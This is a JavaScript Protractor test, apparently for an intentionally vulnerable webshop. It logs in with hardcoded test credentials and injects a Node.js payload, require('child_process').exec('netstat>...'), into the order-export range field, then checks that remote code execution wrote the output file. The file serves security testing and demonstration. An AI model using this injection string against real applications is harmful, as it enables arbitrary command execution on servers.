'use strict';
const path = require('path');
const glob = require("glob");
const HelperFunctions = require('../helperFunctions.js');

describe('RCE Injection', function () {

    beforeEach(function () {
        HelperFunctions.login(browser, 'customer0', 'compass0');
    });

    afterEach(function () {
        HelperFunctions.logout(browser);
    });

    describe('Try to run netstat command', function () {

        beforeEach(function() {
            browser.get(browser.params.webshop);
        });

        it('should be successfully', function () {
            let fileName = 'rceInjection.txt';

            element.all(by.css('.glyphicon.glyphicon-user')).get(0).click();
            browser.sleep(250);
            //Link
            element(by.linkText('My Orders')).click();
            browser.sleep(250);
            //Fill form
            element(by.model('orders.export.from')).sendKeys("1");
            element(by.model('orders.export.range')).sendKeys("require('child_process').exec('netstat>" + fileName + "')");
            element(by.buttonText('Export pdf')).click();

            let filePath = '../../../' + fileName;

            browser.driver.wait(() => {
                let filesArray = glob.sync(path.join(__dirname, filePath));
                if (typeof filesArray !== 'undefined' && filesArray.length > 0) {
                    return filesArray;
                }
            }, 5000).then((filesArray) => {
                expect(filesArray[0]).toContain(fileName);
            });
        });
    });
});
